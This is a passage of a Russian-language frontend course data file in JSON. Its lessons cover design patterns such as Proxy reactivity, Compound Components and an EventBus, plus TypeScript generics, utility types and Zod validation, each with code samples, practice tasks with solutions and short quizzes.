            "code": "// Создание реактивного объекта на чистом Proxy за 20 строк кода!\nfunction createReactiveStore(initialState, onStateChange) {\n  return new Proxy(initialState, {\n    get(target, prop, receiver) {\n      return Reflect.get(target, prop, receiver);\n    },\n    set(target, prop, value, receiver) {\n      const oldValue = target[prop];\n      const success = Reflect.set(target, prop, value, receiver);\n      \n      if (success && oldValue !== value) {\n        console.log(`[Реактивность]: Свойство ${String(prop)} изменено на`, value);\n        onStateChange(target); // Автоматический ре-рендер UI!\n      }\n      return success;\n    }\n  });\n}\n\n// Использование:\nconst state = createReactiveStore({ count: 0, user: 'Гость' }, (newState) => {\n  document.getElementById('counter-val').textContent = newState.count;\n});\n// Любая мутация автоматически обновляет DOM:\n// state.count = 5;",
            "title": "Мини-движок реактивности на Proxy (принцип Vue 3 / MobX)",
            "explanation": "Ловушка set перехватывает изменение полей и автоматически инициирует обновление интерфейса."
          }
        },
        {
          "title": "Паттерны архитектуры компонентов: Compound Components и Custom Hooks",
          "content": "Создание гибких дизайн-систем в React:\n\n1. **Compound Components (Составные компоненты)**:\n- Набор компонентов, которые работают вместе и делят неявное общее состояние через React Context (`<Select><Select.Option /></Select>`, `<Tabs><Tab.List /><Tab.Panel /></Tabs>`).\n- Преимущество: максимальная декларативность и гибкость верстки для потребителя библиотеки.\n\n2. **Паттерн Custom Hooks**:\n- Инкапсуляция логики состояния, таймеров и подписок в чистые переиспользуемые функции (`useDebounce`, `useLocalStorage`, `useMediaQuery`).",
          "codeExample": {
            "language": "typescript",
            "code": "// Паттерн Compound Components: Компонент Аккордеона\nimport React, { createContext, useContext, useState } from 'react';\n\nconst AccordionContext = createContext<{ openId: string | null; toggle: (id: string) => void }>({ openId: null, toggle: () => {} });\n\nexport const Accordion = ({ children }: { children: React.ReactNode }) => {\n  const [openId, setOpenId] = useState<string | null>(null);\n  const toggle = (id: string) => setOpenId(prev => prev === id ? null : id);\n  \n  return <AccordionContext.Provider value={{ openId, toggle }}>{children}</AccordionContext.Provider>;\n};\n\nAccordion.Item = ({ id, title, children }: { id: string; title: string; children: React.ReactNode }) => {\n  const { openId, toggle } = useContext(AccordionContext);\n  const isOpen = openId === id;\n  \n  return (\n    <div className=\"accordion-item\">\n      <button onClick={() => toggle(id)}>{title} {isOpen ? '▲' : '▼'}</button>\n      {isOpen && <div className=\"accordion-body\">{children}</div>}\n    </div>\n  );\n};\n\n// Использование: невероятно чисто и выразительно!\n// <Accordion>\n//   <Accordion.Item id=\"1\" title=\"Что такое FSD?\">Архитектура слоев...</Accordion.Item>\n//   <Accordion.Item id=\"2\" title=\"Что такое SSR?\">Рендеринг на сервере...</Accordion.Item>\n// </Accordion>",
            "title": "Паттерн Compound Components: Декларативный Аккордеон",
            "explanation": "Родитель и дети делят общий контекст, позволяя потребителю компонента менять структуру как угодно."
          }
        }
      ],
      "seniorTips": [
        "Используйте паттерн PubSub для событий между независимыми виджетами (например, синхронизация корзины и мини-уведомлений).",
        "При создании UI-компонентов со сложной структурой (Select, Tabs, Accordion, Modal) всегда применяйте паттерн Compound Components.",
        "Выносите переиспользуемую логику в Custom Hooks — это очищает JSX-верстку и упрощает модульное тестирование.",
        "Паттерн Strategy идеален для форм с переключаемыми способами оплаты, доставки или валидации."
      ],
      "commonMistakes": [
        {
          "bad": "// Жесткая связка (Tight Coupling): модуль напрямую обращается к чужому DOM\ndocument.querySelector('.cart-header-badge').textContent = '5';",
          "good": "events.emit('cart:updated', { count: 5 }); // Слабая связка через PubSub",
          "reason": "Прямое обращение к чужому DOM ломается при любом изменении верстки шапки. PubSub делает модули независимыми."
        },
        {
          "bad": "// Забытая отписка от событий Event Bus\nuseEffect(() => { globalEvents.subscribe('alert', showAlert); }, []); // Утечка памяти!",
          "good": "useEffect(() => { const unsub = globalEvents.subscribe('alert', showAlert); return unsub; }, []);",
          "reason": "Без вызова unsubscribe обработчик навсегда остается в памяти и продолжает выполняться даже после размонтирования компонента."
        },
        {
          "bad": "// Оверинжиниринг: создание 10 фабрик для простого объекта из 2 полей",
          "good": "const user = { name: 'Иван', role: 'user' };",
          "reason": "Применяйте паттерны только тогда, когда в них есть реальная архитектурная необходимость."
        }
      ],
      "keyTakeaways": [
        "Паттерны проектирования решают типовые задачи структурирования кода.",
        "PubSub обеспечивает слабую связанность модулей (Loose Coupling).",
        "Proxy лежит в основе современной реактивности (Vue 3, MobX, Immer).",
        "Compound Components обеспечивают максимальную гибкость и чистоту декларативного JSX.",
        "Strategy позволяет легко заменять алгоритмы во время работы приложения."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"patterns-app\">\n  <h3>PubSub Event Bus & Strategy Демо</h3>\n  <div style=\"margin-bottom:12px;\">\n    <button id=\"btn-pub-event\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">Опубликовать событие 'item:added'</button>\n  </div>\n  <div id=\"sub-display\" style=\"padding:10px; background:#161b22; border-radius:6px; color:#29e7ff; font-size:12px;\">Слушатель PubSub: ожидает событий...</div>\n</div>",
      "initialCss": "#patterns-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "// Реализация простого Event Bus\nclass MiniBus {\n  constructor() { this.handlers = []; }\n  sub(fn) { this.handlers.push(fn); }\n  emit(data) { this.handlers.forEach(fn => fn(data)); }\n}\n\nconst bus = new MiniBus();\nconst display = document.getElementById('sub-display');\nlet count = 0;\n\n// Подписчик 1: обновляет счетчик\nbus.sub((data) => {\n  display.textContent = `⚡ [PubSub Triggered]: ${data.message} | Всего добавлено: ${data.count}`;\n});\n\ndocument.getElementById('btn-pub-event').onclick = () => {\n  count++;\n  bus.emit({ message: 'Товар добавлен в корзину', count });\n};",
      "instructions": "Практика с паттернами:\n1. Нажмите 'Опубликовать событие' — издатель отправит сообщение через Event Bus\n2. Подписчик получит данные без прямой связи с кнопкой!"
    },
    "task": {
      "title": "Реализация брокера событий PubSub EventBus с безопасной отпиской",
      "scenario": "Создайте класс EventBus: он должен поддерживать методы on(event, callback) с возвратом функции отписки, emit(event, payload) для рассылки событий подписчикам и once(event, callback) для однократного срабатывания.",
      "criteria": [
        "Реализованы методы on, emit, once",
        "Метод on возвращает функцию отписки unsubscribe",
        "Метод once автоматически отписывается после первого вызова",
        "Поддерживается передача произвольных данных payload"
      ],
      "starterCode": {
        "js": "// Реализуйте EventBus\nclass EventBus {\n  // Ваш код\n}"
      },
      "hints": [
        "Храните слушателей в Map<string, Set<Function>>",
        "once: const unsub = this.on(event, (data) => { unsub(); callback(data); });",
        "on: return () => this.listeners.get(event)?.delete(callback);"
      ],
      "solution": {
        "js": "class EventBus {\n  constructor() {\n    this.listeners = new Map();\n  }\n\n  on(event, callback) {\n    if (!this.listeners.has(event)) {\n      this.listeners.set(event, new Set());\n    }\n    this.listeners.get(event).add(callback);\n\n    // Возвращаем функцию отписки\n    return () => {\n      const set = this.listeners.get(event);\n      if (set) {\n        set.delete(callback);\n        if (set.size === 0) this.listeners.delete(event);\n      }\n    };\n  }\n\n  emit(event, payload) {\n    const set = this.listeners.get(event);\n    if (set) {\n      set.forEach((callback) => {\n        try {\n          callback(payload);\n        } catch (err) {\n          console.error(`Ошибка в обработчике события ${event}:`, err);\n        }\n      });\n    }\n  }\n\n  once(event, callback) {\n    const unsubscribe = this.on(event, (payload) => {\n      unsubscribe();\n      callback(payload);\n    });\n    return unsubscribe;\n  }\n}\n\nconsole.log('EventBus успешно реализован!');",
        "explanation": "EventBus обеспечивает безопасную отписку через замыкание, поддерживает одноразовые события once и изолирует ошибки слушателей через try/catch."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro7-q1",
          "question": "Виджет корзины должен обновляться при добавлении товара из каталога. Почему шина событий лучше прямого вызова метода корзины?",
          "options": [
            "Каталог не обязан знать о существовании корзины — модули остаются независимыми",
            "Шина работает асинхронно и потому не блокирует отрисовку каталога товаров",
            "Прямой вызов метода невозможен между модулями, лежащими в разных файлах",
            "Шина событий автоматически сохраняет состояние корзины между перезагрузками"
          ],
          "correctIndex": 0,
          "explanation": "При прямом вызове каталог импортирует корзину и завязывается на её интерфейс: переименуется метод — сломается каталог, понадобится третий подписчик — придётся править обе стороны. Издатель просто сообщает «товар добавлен», не зная, кто его слушает, а подписчиков может быть сколько угодно. Цена такой развязки — менее очевидный поток управления, поэтому имена событий стоит держать в одном месте и типизировать."
        },
        {
          "id": "pro7-q2",
          "question": "Какой механизм реализован в этом коде и в чём его преимущество перед перебором свойств с геттерами?",
          "codeSnippet": "const state = new Proxy({ count: 0 }, {\n  get(t, k) { track(k); return t[k]; },\n  set(t, k, v) { t[k] = v; trigger(k); return true; }\n});",
          "options": [
            "Кеширование значений; перехват работает быстрее прямого обращения к объекту",
            "Валидация: перехватчик проверяет типы значений перед записью их в объект",
            "Иммутабельность: объект защищён от любых изменений извне на уровне движка",
            "Реактивность: перехват ловит и новые свойства, и удаление, чего геттеры не умеют"
          ],
          "correctIndex": 3,
          "explanation": "Это ядро реактивности: чтение регистрирует зависимость, запись оповещает подписчиков. Старый подход подменял геттеры и сеттеры у каждого существующего свойства, поэтому добавление нового свойства или удаление старого система не замечала — во Vue 2 для этого существовали специальные методы. Перехватчик работает с объектом целиком и ловит любые операции, включая появление новых ключей."
        },
        {
          "id": "pro7-q3",
          "question": "В чём выгода составных компонентов вида `<Select>` и `<Select.Option>`?",
          "options": [
            "Дочерние компоненты отрисовываются быстрее, поскольку минуют согласование дерева",
            "Разметка описывает структуру декларативно, а общее состояние живёт в контексте",
            "Такой подход полностью избавляет от необходимости передавать обработчики событий",
            "Вложенные компоненты автоматически наследуют стили своего родительского элемента"
          ],
          "correctIndex": 1,
          "explanation": "Альтернатива — компонент с десятком настроек вроде массива вариантов, функции отрисовки пункта и флагов оформления, который всё равно не покроет очередной нестандартный случай. Составной вариант отдаёт структуру наружу: разработчик расставляет части как ему нужно, а связь между ними обеспечивает общий контекст, скрытый внутри. Выбранное значение и обработчики при этом никуда не деваются, просто их не приходится прокидывать вручную."
        },
        {
          "id": "pro7-q4",
          "question": "Подписка на событие оформлена в эффекте компонента, но функция отписки не возвращена. Что произойдёт?",
          "options": [
            "При каждом монтировании добавится новый обработчик, и со временем сработают все сразу",
            "Ничего: подписка снимается сама, когда компонент удаляется из дерева",
            "Событие перестанет доходить до компонента сразу после первого срабатывания",
            "Возникнет ошибка во время выполнения при попытке повторной подписки на то же событие"
          ],
          "correctIndex": 0,
          "explanation": "Шина ничего не знает о жизненном цикле компонентов: обработчик остаётся в её списке навсегда и продолжает выполняться, пытаясь обновить состояние уже удалённого компонента. Пройдя по экрану пять раз, пользователь получит пять срабатываний на одно событие. Заодно замыкание обработчика удерживает в памяти всё состояние компонента. Поэтому подписка обязана возвращать функцию отмены, а эффект — вызывать её при очистке."
        },
        {
          "id": "pro7-q5",
          "question": "В форме оформления заказа нужно переключать способы оплаты, у каждого своя логика проверки и отправки. Какой паттерн подходит?",
          "options": [
            "Одиночка — единый экземпляр обработчика оплаты на всё приложение целиком",
            "Наблюдатель — подписка на изменение выбранного пользователем способа оплаты",
            "Стратегия — взаимозаменяемые алгоритмы за общим интерфейсом, выбираемые при работе",
            "Фабрика — создание объектов заказа с разными наборами доступных полей"
          ],
          "correctIndex": 2,
          "explanation": "Каждый способ оплаты оформляется отдельным объектом с одинаковым набором методов, а выбор нужного сводится к взятию его из словаря по ключу. Добавление нового способа не требует трогать код формы — достаточно дописать стратегию и строку в словарь. Это прямая замена длинной цепочки условий и одновременно соблюдение принципа открытости для расширения."
        }
      ]
    }
  },
  {
    "id": "pro-8",
    "moduleId": "pro",
    "level": 8,
    "title": "TypeScript в реальных проектах: Generics, Utility Types и Type Safety",
    "subtitle": "Generics, Utility Types, Conditional Types, оператор satisfies, Discriminated Unions и Zod Runtime Validation",
    "description": "Освойте TypeScript на профессиональном уровне: параметризованные типы Generics, встроенные Utility Types (Partial, Pick, Omit, Record, ReturnType), условные Conditional Types, сужение типов (Type Narrowing), оператор satisfies и валидацию данных в рантайме с библиотекой Zod.",
    "estimatedMinutes": 70,
    "difficulty": "intermediate",
    "tags": [
      "typescript",
      "generics",
      "utility-types",
      "conditional-types",
      "zod",
      "type-safety",
      "satisfies",
      "discriminated-unions"
    ],
    "theory": {
      "overview": "TypeScript стал безальтернативным стандартом корпоративной фронтенд-разработки. Однако многие разработчики используют TS лишь как «статические подсказки», злоупотребляя `any` и дублируя типы.\n\nВ этом уроке мы освоим продвинутую систему типов: **Generics**, трансформацию типов через **Utility Types**, защиту от невалидных API-ответов в рантайме через **Zod** и современные операторы TypeScript.",
      "sections": [
        {
          "title": "Generics (Обобщения): параметризованные функции и интерфейсы",
          "content": "Generics позволяют типам принимать другие типы в качестве аргументов:\n\n1. **Зачем нужны Generics**:\n- Без дженериков функция `function identity(arg: any): any` теряет информацию о типе. Если передали строку — TS не знает, что вернулась строка.\n- С дженериком `function identity<T>(arg: T): T` тип сохраняется со 100% точностью!\n\n2. **Типизация сетевых ответов**:\n- `async function apiGet<T>(url: string): Promise<T>` позволяет получать строго типизированный ответ: `const user = await apiGet<User>('/api/me');`.\n\n3. **Ограничения дженериков (`Generic Constraints`)**:\n- `function getLength<T extends { length: number }>(item: T): number` — гарантирует, что аргумент имеет свойство `length` (строка, массив).",
          "image": {
            "src": "/images/lessons/web-typescript-advanced.svg",
            "alt": "TypeScript в реальных проектах: Generics, Utility Types и Zod",
            "caption": "Generics, встроенные Utility Types (Partial, Omit), Type Narrowing и Zod для валидации API в рантайме"
          },
          "codeExample": {
            "language": "typescript",
            "code": "// Универсальный типизированный HTTP-клиент с Generics\nasync function fetchApi<TData>(endpoint: string): Promise<TData> {\n  const response = await fetch(`https://api.example.com${endpoint}`);\n  if (!response.ok) throw new Error(`HTTP ${response.status}`);\n  return response.json() as Promise<TData>;\n}\n\ninterface UserProfile {\n  id: string;\n  email: string;\n  roles: string[];\n}\n\n// Вызов с автоматическим выводом типа UserProfile!\nconst user = await fetchApi<UserProfile>('/users/me');\nconsole.log(user.email.toLowerCase()); // Полный автокомплит и type safety!",
            "title": "Использование Generics для строгой типизации сетевых запросов",
            "explanation": "Дженерик TData параметризует результат промиса, обеспечивая автокомплит и защиту от опечаток в полях."
          }
        },
        {
          "title": "Встроенные Utility Types: Partial, Pick, Omit, Record и ReturnType",
          "content": "Трансформация существующих типов без дублирования кода:\n\n1. **`Partial<T>`** — делает ВСЕ поля типа опциональными (идеально для форм редактирования профиля `updateUser(id, data: Partial<User>)`).\n\n2. **`Required<T>`** — делает все поля обязательными.\n\n3. **`Readonly<T>`** — запрещает мутацию полей объекта.\n\n4. **`Pick<T, 'id' | 'name'>`** — выбирает ТОЛЬКО указанные ключи из типа `T`.\n\n5. **`Omit<T, 'password' | 'salt'>`** — исключает указанные ключи из типа `T` (идеально для DTO без секретных полей).\n\n6. **`Record<Keys, Value>`** — словарь/карта: `Record<string, User>` или `Record<'admin' | 'user', Permission>`.\n\n7. **`ReturnType<typeof fn>`** — извлекает тип возвращаемого значения функции.",
          "codeExample": {
            "language": "typescript",
            "code": "interface FullCourse {\n  id: string;\n  title: string;\n  description: string;\n  price: number;\n  authorId: string;\n  isPublished: boolean;\n  createdAt: Date;\n}\n\n// 1. Создание: исключаем автогенерируемые id и createdAt\ntype CreateCourseDTO = Omit<FullCourse, 'id' | 'createdAt'>;\n\n// 2. Обновление: разрешаем частичное обновление любых полей\ntype UpdateCourseDTO = Partial<CreateCourseDTO>;\n\n// 3. Карточка превью: только id, title и price\ntype CoursePreview = Pick<FullCourse, 'id' | 'title' | 'price'>;\n\n// 4. Словарь курсов по id\ntype CourseMap = Record<string, FullCourse>;",
            "title": "Трансформация DTO через Omit, Partial, Pick и Record",
            "explanation": "Из одного базового интерфейса FullCourse порождаются все необходимые типы приложения без дублирования полей."
          }
        },
        {
          "title": "Type Narrowing, Discriminated Unions и оператор satisfies",
          "content": "Продвинутые техники безопасной работы с типами:\n\n1. **Discriminated Unions (Размеченные объединения)**:\n- Паттерн для состояний с общим полем-дискриминатором (`status: 'loading' | 'success' | 'error'`).\n- TS автоматически понимает, какие поля доступны в блоке `if (res.status === 'success')`!\n\n2. **Оператор `satisfies` (TypeScript 4.9+)**:\n- Проверяет, что объект соответствует типу, **НЕ расширяя его**.\n- Сохраняет точные типы литералов для идеального автокомплита.",
          "codeExample": {
            "language": "typescript",
            "code": "// Discriminated Union для асинхронного состояния запроса\ntype AsyncState<T> =\n  | { status: 'idle' }\n  | { status: 'loading' }\n  | { status: 'success'; data: T }\n  | { status: 'error'; error: string };\n\nfunction renderState(state: AsyncState<string[]>) {\n  switch (state.status) {\n    case 'idle': return 'Ожидание запуска';\n    case 'loading': return 'Загрузка спиннера...';\n    case 'error': return `Ошибка: ${state.error}`; // TS знает, что тут есть .error!\n    case 'success': return `Найдено: ${state.data.join(', ')}`; // TS знает про .data!\n  }\n}\n\n// Оператор satisfies: строгая проверка без потери точности\nconst themeConfig = {\n  primary: '#2dff8a',\n  secondary: '#29e7ff',\n} satisfies Record<string, string>;\n// themeConfig.primary сохраняет точный тип '#2dff8a', а не string!",
            "title": "Discriminated Unions и оператор satisfies",
            "explanation": "Discriminated Unions делают невозможными невалидные состояния (например, доступ к data при status === 'error')."
          }
        },
        {
          "title": "Zod: Валидация типов в Runtime (Compile-time vs Runtime)",
          "content": "Главная иллюзия TypeScript:\n- **TypeScript существует ТОЛЬКО до компиляции**! В рантайме браузера TS полностью удаляется, превращаясь в чистый JavaScript.\n- Если бэкенд неожиданно вернет `null` или изменит поле `user.id` на `user_id`, TypeScript не сможет защитить приложение от ошибки `TypeError: Cannot read properties of null` в рантайме.\n\nРешение: **Библиотека Zod (Runtime Schema Validation)**:\n1. Описываем схему данных: `const UserSchema = z.object({ id: z.string(), email: z.string().email() });`\n2. Автоматически извлекаем TS-тип: `type User = z.infer<typeof UserSchema>;`\n3. Валидируем реальный ответ API: `const user = UserSchema.parse(await response.json());`\n4. Если данные не совпали — Zod выбросит понятную ошибку до того, как сломается UI!",
          "codeExample": {
            "language": "typescript",
            "code": "import { z } from 'zod';\n\n// 1. Описание схемы валидации\nexport const ProductSchema = z.object({\n  id: z.number().positive(),\n  title: z.string().min(3),\n  price: z.number().min(0),\n  category: z.enum(['courses', 'books', 'tools']),\n  inStock: z.boolean().default(true),\n});\n\n// 2. Автоматический вывод TypeScript типа из схемы!\nexport type Product = z.infer<typeof ProductSchema>;\n\n// 3. Безопасная валидация ответа сервера\nexport async function loadProduct(id: number): Promise<Product> {\n  const rawData = await fetch(`/api/products/${id}`).then(r => r.json());\n  \n  // Безопасный парсинг: если сервер прислал кривые данные, мы узнаем об этом сразу!\n  const result = ProductSchema.safeParse(rawData);\n  if (!result.success) {\n    console.error('Схема бэкенда не соответствует контракту:', result.error.format());\n    throw new Error('Некорректный формат ответа сервера');\n  }\n  \n  return result.data; // 100% валидный типизированный Product!\n}",
            "title": "Связка TypeScript + Zod: 100% Type Safety в рантайме",
            "explanation": "Zod связывает compile-time типы со строгой валидацией реальных данных от API."
          }
        }
      ],
      "seniorTips": [
        "Используйте Zod для валидации ответов внешних API и форм — это защитит приложение от падений в рантайме.",
        "Вместо дублирования интерфейсов применяйте встроенные Utility Types: `Omit`, `Pick`, `Partial`, `Record`.",
        "Для моделирования состояний (loading/success/error) всегда используйте Discriminated Unions — это предотвращает невозможные состояния интерфейса.",
        "Никогда не используйте тип `any`. Если тип действительно неизвестен — используйте `unknown` с последующим сужением через type guards."
      ],
      "commonMistakes": [
        {
          "bad": "// Использование any при работе с API\nconst data: any = await fetch('/api/user').then(r => r.json());\nconsole.log(data.nonExistentField.foo); // ❌ Падение в проде!",
          "good": "const UserSchema = z.object({ id: z.string(), name: z.string() });\nconst user = UserSchema.parse(await res.json());",
          "reason": "any отключает всю проверку типов. Zod проверяет структуру на лету и гарантирует типы."
        },
        {
          "bad": "// Ручное дублирование типов для DTO создания и обновления\ninterface User { id: string; name: string; age: number; }\ninterface CreateUserDTO { name: string; age: number; }\ninterface UpdateUserDTO { name?: string; age?: number; }",
          "good": "type CreateUserDTO = Omit<User, 'id'>;\ntype UpdateUserDTO = Partial<CreateUserDTO>;",
          "reason": "При добавлении нового поля в User придется руками менять 5 интерфейсов. Utility Types обновляют всё автоматически."
        },
        {
          "bad": "// Кастинг через 'as' без проверки данных (Type Assertion Abuse)\nconst user = rawData as User; // Если rawData === null, приложение упадет!",
          "good": "if (isUser(rawData)) { /* Type Guard */ }",
          "reason": "as отключает проверки компилятора, создавая ложное ощущение типобезопасности."
        }
      ],
      "keyTakeaways": [
        "Generics параметризуют типы, сохраняя информацию о переданных сущностях.",
        "Utility Types (Omit, Pick, Partial, Record) преобразуют типы без дублирования кода.",
        "Discriminated Unions исключают невалидные состояния приложения.",
        "Zod обеспечивает настоящую типобезопасность в рантайме, проверяя ответы API.",
        "Замена `any` на `unknown` с Type Guards делает кодовую базу надежной."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"ts-app\">\n  <h3>TypeScript & Zod Валидатор API</h3>\n  <button id=\"btn-valid\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer; margin-right:8px;\">Отправить валидный JSON</button>\n  <button id=\"btn-invalid\" style=\"background:#f85149; color:#fff; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">Отправить поврежденный JSON</button>\n  <pre id=\"ts-log\" style=\"margin-top:12px; color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px;\"></pre>\n</div>",
      "initialCss": "#ts-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const log = document.getElementById('ts-log');\n\n// Мини-валидатор (симулятор Zod Schema)\nfunction validateUser(data) {\n  const errors = [];\n  if (typeof data.id !== 'number') errors.push('Поле id должно быть number');\n  if (typeof data.email !== 'string' || !data.email.includes('@')) errors.push('Некорректный email');\n  if (!['admin', 'intern'].includes(data.role)) errors.push('role должна быть \"admin\" или \"intern\"');\n  \n  return { success: errors.length === 0, errors, data };\n}\n\ndocument.getElementById('btn-valid').onclick = () => {\n  const payload = { id: 101, email: 'intern@academy.dev', role: 'intern' };\n  const res = validateUser(payload);\n  log.style.color = '#2dff8a';\n  log.textContent = `✅ Zod Валидация успешна!\\nТипизированный объект User:\\n` + JSON.stringify(res.data, null, 2);\n};\n\ndocument.getElementById('btn-invalid').onclick = () => {\n  const payload = { id: 'wrong-id-string', email: 'no-at-sign', role: 'super-hacker' };\n  const res = validateUser(payload);\n  log.style.color = '#f85149';\n  log.textContent = `❌ Zod перехватил невалидный ответ API в Runtime!\\nОшибки контракта:\\n` + res.errors.map(e => '  • ' + e).join('\\n');\n};",
      "instructions": "Практика с TypeScript & Zod:\n1. Нажмите 'Отправить валидный JSON' — данные успешно проходят схему\n2. Нажмите 'Отправить поврежденный JSON' — валидатор предотвращает падение интерфейса и выдает список ошибок"
    },
    "task": {
      "title": "Проектирование типизированного хранилища DTO с Zod-валидацией",
      "scenario": "Спроектируйте систему типов для управления статьями блога: базовый интерфейс Article, DTO для создания CreateArticleDTO через Omit, DTO для обновления UpdateArticleDTO через Partial, и напишите Zod-схему для валидации входящей статьи с полями id (number), title (string min 5), tags (array of strings).",
      "criteria": [
        "Создан интерфейс Article с полями id, title, content, tags, createdAt, isPublished",
        "Сформирован CreateArticleDTO с помощью Omit<Article, 'id' | 'createdAt'>",
        "Сформирован UpdateArticleDTO с помощью Partial<CreateArticleDTO>",
        "Объявлена схема ArticleSchema с валидацией типов и выведен тип z.infer"
      ],
      "starterCode": {
        "js": "// Опишите типы и Zod схему\n// Ваш код"
      },
      "hints": [
        "type CreateArticleDTO = Omit<Article, 'id' | 'createdAt'>;",
        "type UpdateArticleDTO = Partial<CreateArticleDTO>;",
        "const ArticleSchema = z.object({ id: z.number(), title: z.string().min(5), tags: z.array(z.string()) });"
      ],
      "solution": {
        "js": "import { z } from 'zod';\n\n// 1. Zod схема валидации в Runtime\nexport const ArticleSchema = z.object({\n  id: z.number().positive(),\n  title: z.string().min(5, 'Заголовок должен содержать минимум 5 символов'),\n  content: z.string().min(20),\n  tags: z.array(z.string()),\n  isPublished: z.boolean().default(false),\n  createdAt: z.string().datetime().optional(),\n});\n\n// 2. Автовывод полного интерфейса из Zod схемы\nexport type Article = z.infer<typeof ArticleSchema>;\n\n// 3. DTO через Utility Types\nexport type CreateArticleDTO = Omit<Article, 'id' | 'createdAt'>;\nexport type UpdateArticleDTO = Partial<CreateArticleDTO>;\n\nconsole.log('Типобезопасная архитектура DTO готова!');",
        "explanation": "Связка Zod + Utility Types исключает рассинхронизацию интерфейсов и гарантирует 100% валидность данных в рантайме."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro8-q1",
          "question": "Что произойдёт с типом `PublicUser`, если в интерфейс `User` добавить поле `email`?",
          "codeSnippet": "interface User { id: number; name: string; password: string; salt: string }\ntype PublicUser = Omit<User, 'password' | 'salt'>;",
          "options": [
            "Ничего: производный тип фиксируется в момент объявления и дальше не меняется",
            "Компилятор выдаст ошибку: список исключаемых полей придётся обновить вручную",
            "Поле автоматически появится и в производном типе — в этом и состоит смысл приёма",
            "Новое поле станет необязательным, поскольку отсутствует в исходном списке исключений"
          ],
          "correctIndex": 2,
          "explanation": "Служебный тип вычисляется от исходного при каждой проверке, поэтому производный тип всегда остаётся в синхроне. Именно поэтому их предпочитают дублированию интерфейсов: одно изменение в источнике расходится по всем производным. Обратная сторона — исключение по именам молча переживает переименование поля, так что для критичных мест иногда явно перечисляют нужные поля через `Pick`."
        },
        {
          "id": "pro8-q2",
          "question": "Интерфейс аккуратно описывает ответ API, но приложение всё равно падает на реальных данных. Почему?",
          "options": [
            "Компилятор проверяет лишь собственные модули проекта, но не внешние запросы",
            "Типы проверяются в рантайме, но только в режиме разработки, а не в готовой сборке",
            "Ответ нужно приводить оператором утверждения типа, иначе проверка не выполняется",
            "Описание типа проверяется только при компиляции и исчезает из собранного кода"
          ],
          "correctIndex": 3,
          "explanation": "Типы существуют только на этапе разработки: при сборке они полностью стираются, и в браузер уходит обычный JavaScript без единой проверки. Интерфейс описывает ваши ожидания от сервера, но ничего о нём не гарантирует — бэкенд может прислать `null` вместо массива или переименовать поле. Отсюда практика проверять внешние данные схемой во время выполнения: библиотека вроде Zod и проверит структуру, и выведет из схемы статический тип."
        },
        {
          "id": "pro8-q3",
          "question": "Что даёт такое описание состояния по сравнению с одним объектом, где все поля необязательны?",
          "codeSnippet": "type State =\n  | { status: 'loading' }\n  | { status: 'success'; data: User[] }\n  | { status: 'error'; message: string };",
          "options": [
            "Меньший размер собранного кода: объединение занимает меньше места в памяти",
            "Значения статуса автоматически проверяются во время выполнения при присваивании",
            "Компилятор сам генерирует функции-предикаты для проверки каждого из вариантов",
            "Невозможные комбинации не проходят проверку, а поля сужаются по значению статуса"
          ],
          "correctIndex": 3,
          "explanation": "Объект с необязательными полями допускает бессмысленные состояния: одновременно загрузка и ошибка, успех без данных. Размеченное объединение делает такие комбинации невыразимыми, и компилятор ловит ошибку до запуска. Вдобавок после проверки значения поля-метки он точно знает, какие поля доступны в этой ветке, — обращение к сообщению об ошибке в ветке успеха просто не скомпилируется."
        },
        {
          "id": "pro8-q4",
          "question": "Функция частичного обновления профиля принимает любое подмножество полей пользователя. Какой служебный тип описывает её аргумент?",
          "options": [
            "`Required<User>` — все поля становятся обязательными для передачи в функцию",
            "`Record<string, User>` — произвольный набор пар из ключа и значения",
            "`Readonly<User>` — поля защищаются от изменения после создания объекта",
            "`Partial<User>` — все поля объявляются необязательными"
          ],
          "correctIndex": 3,
          "explanation": "Этот служебный тип добавляет знак необязательности каждому полю исходного типа, что в точности соответствует смыслу частичного обновления: передаём только то, что меняем. Противоположный по действию тип, наоборот, снимает необязательность, а защита от изменения и словарь решают совсем другие задачи. Все они при желании пишутся вручную через сопоставленные типы."
        },
        {
          "id": "pro8-q5",
          "question": "Ответ сервера приводят к нужной форме записью `const user = data as User`. Что это на самом деле даёт?",
          "options": [
            "Проверку структуры во время выполнения: несоответствие вызовет исключение",
            "Только обещание компилятору — реальные данные при этом никто не проверяет",
            "Преобразование объекта к нужной форме с отбрасыванием всех лишних полей",
            "Автоматическую генерацию схемы валидации на основе описания указанного типа"
          ],
          "correctIndex": 1,
          "explanation": "Утверждение типа — способ сказать компилятору «поверь мне», и тот перестаёт возражать. Никакого кода при этом не порождается: если сервер пришлёт другую структуру, ошибка вылезет позже и в совершенно другом месте, где отладить её гораздо труднее. Для внешних данных нужна настоящая проверка схемой, а утверждение оставляют для редких случаев, когда вы действительно знаете больше компилятора."
        }
      ]
    }
  },
  {
    "id": "pro-9",
    "moduleId": "pro",
    "level": 9,
    "title": "CI/CD Pipeline и Автоматизация Деплоя",
    "subtitle": "GitHub Actions, Lint/Test/Build конвейер, Preview Deployments, Vercel/Netlify и мониторинг",
    "description": "Освойте практику непрерывной интеграции и доставки (CI/CD): настройку конвейера GitHub Actions с этапами Lint, Test, Build, Preview Deployment и Production Deploy на платформах Vercel/Netlify, стратегии деплоя (Canary, Blue-Green), мониторинг ошибок через Sentry и откат при деградации Web Vitals.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "ci-cd",
      "github-actions",
      "deployment",
      "vercel",
      "netlify",
      "preview",
      "sentry",
      "monitoring"
    ],
    "theory": {
